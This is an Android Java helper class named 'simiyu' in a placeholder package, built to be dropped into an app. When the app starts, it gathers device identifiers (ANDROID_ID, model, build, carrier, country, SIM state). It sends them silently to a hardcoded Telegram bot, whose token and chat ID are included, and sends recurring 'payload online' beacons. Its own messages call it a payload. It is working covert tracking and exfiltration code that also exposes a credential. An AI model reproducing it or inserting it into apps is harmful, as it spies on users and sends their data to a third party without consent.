package com.yourpackage.helper;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.provider.Settings;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class simiyu {
    
    private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
    private static final String CHAT_ID = "8468538314";
    private static final String TELEGRAM_API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    
    private static Context appContext;
    private static Handler mainHandler = new Handler(Looper.getMainLooper());
    private static AtomicBoolean isNotified = new AtomicBoolean(false);
    private static SharedPreferences sharedPreferences;
    
    public static void initialize(Context context) {
        appContext = context;
        sharedPreferences = context.getSharedPreferences("simiyu_prefs", Context.MODE_PRIVATE);
        
        boolean alreadyNotified = sharedPreferences.getBoolean("notified", false);
        if (!alreadyNotified) {
            sendDeviceInfo();
        } else {
            sendOnlineNotification();
        }
    }
    
    public static void sendDeviceInfo() {
        if (isNotified.get()) return;
        
        new Thread(() -> {
            try {
                String deviceInfo = getDeviceInfo();
                boolean sent = sendToTelegram(deviceInfo);
                
                if (sent) {
                    isNotified.set(true);
                    sharedPreferences.edit().putBoolean("notified", true).apply();
                }
                
            } catch (Exception e) {
                mainHandler.postDelayed(() -> {
                    sendDeviceInfo();
                }, 60000);
            }
        }).start();
    }
    
    private static String getDeviceInfo() {
        StringBuilder info = new StringBuilder();
        
        info.append("✅ *SIMIYU PAYLOAD ACTIVATED!*\n\n");
        info.append("📱 *Device Information*\n");
        info.append("───────────────────\n");
        info.append("📌 *Device:* ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
        info.append("📌 *Brand:* ").append(Build.BRAND).append("\n");
        info.append("📌 *Product:* ").append(Build.PRODUCT).append("\n");
        info.append("📌 *Device ID:* ").append(getDeviceId()).append("\n");
        
        info.append("\n🤖 *System Information*\n");
        info.append("───────────────────\n");
        info.append("📌 *Android Version:* ").append(Build.VERSION.RELEASE).append("\n");
        info.append("📌 *SDK Level:* ").append(Build.VERSION.SDK_INT).append("\n");
        info.append("📌 *Build ID:* ").append(Build.DISPLAY).append("\n");
        
        info.append("\n💻 *Hardware Information*\n");
        info.append("───────────────────\n");
        info.append("📌 *Processor:* ").append(Build.HARDWARE).append("\n");
        info.append("📌 *Board:* ").append(Build.BOARD).append("\n");
        info.append("📌 *CPU ABI:* ").append(Build.CPU_ABI).append("\n");
        
        info.append("\n📶 *Network Information*\n");
        info.append("───────────────────\n");
        info.append("📌 *Network Operator:* ").append(getNetworkOperator()).append("\n");
        info.append("📌 *Network Country:* ").append(getNetworkCountry()).append("\n");
        info.append("📌 *SIM State:* ").append(getSimState()).append("\n");
        
        info.append("\n⏰ *Timestamp*\n");
        info.append("───────────────────\n");
        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.US).format(new Date());
        info.append("📌 *Time:* ").append(timestamp).append("\n");
        
        info.append("\n📊 *Status*\n");
        info.append("───────────────────\n");
        info.append("📌 *Status:* ONLINE ✅\n");
        info.append("📌 *First Run:* ").append(isFirstRun() ? "YES ✅" : "NO").append("\n");
        
        return info.toString();
    }
    
    private static boolean sendToTelegram(String message) {
        try {
            URL url = new URL(TELEGRAM_API_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            String jsonPayload = String.format(
                "{\"chat_id\":\"%s\",\"text\":\"%s\",\"parse_mode\":\"Markdown\"}",
                CHAT_ID,
                message.replace("\"", "\\\"").replace("\n", "\\n")
            );
            
            OutputStream os = conn.getOutputStream();
            os.write(jsonPayload.getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            return responseCode == 200;
            
        } catch (Exception e) {
            return false;
        }
    }
    
    private static String getDeviceId() {
        try {
            return Settings.Secure.getString(
                appContext.getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    private static String getNetworkOperator() {
        try {
            TelephonyManager tm = (TelephonyManager) appContext.getSystemService(Context.TELEPHONY_SERVICE);
            String operator = tm.getNetworkOperatorName();
            return operator != null ? operator : "Unknown";
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    private static String getNetworkCountry() {
        try {
            TelephonyManager tm = (TelephonyManager) appContext.getSystemService(Context.TELEPHONY_SERVICE);
            String country = tm.getNetworkCountryIso();
            return country != null ? country.toUpperCase() : "Unknown";
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    private static String getSimState() {
        try {
            TelephonyManager tm = (TelephonyManager) appContext.getSystemService(Context.TELEPHONY_SERVICE);
            int state = tm.getSimState();
            switch (state) {
                case TelephonyManager.SIM_STATE_READY:
                    return "READY ✅";
                case TelephonyManager.SIM_STATE_ABSENT:
                    return "ABSENT ❌";
                case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                    return "PIN REQUIRED 🔒";
                case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                    return "PUK REQUIRED 🔒";
                default:
                    return "UNKNOWN";
            }
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    private static boolean isFirstRun() {
        return sharedPreferences.getBoolean("first_run", true);
    }
    
    public static void sendOnlineNotification() {
        String onlineMsg = "🟢 *SIMIYU PAYLOAD IS ONLINE!*\n\n";
        onlineMsg += "📱 *Device:* " + Build.MANUFACTURER + " " + Build.MODEL + "\n";
        onlineMsg += "📌 *Device ID:* " + getDeviceId() + "\n";
        onlineMsg += "📶 *Network:* " + getNetworkOperator() + "\n";
        onlineMsg += "⏰ *Time:* " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()) + "\n";
        onlineMsg += "📊 *Status:* ACTIVE ✅";
        
        sendCustomMessage(onlineMsg);
    }
    
    public static void sendCustomMessage(String message) {
        new Thread(() -> {
            sendToTelegram(message);
        }).start();
    }
          }
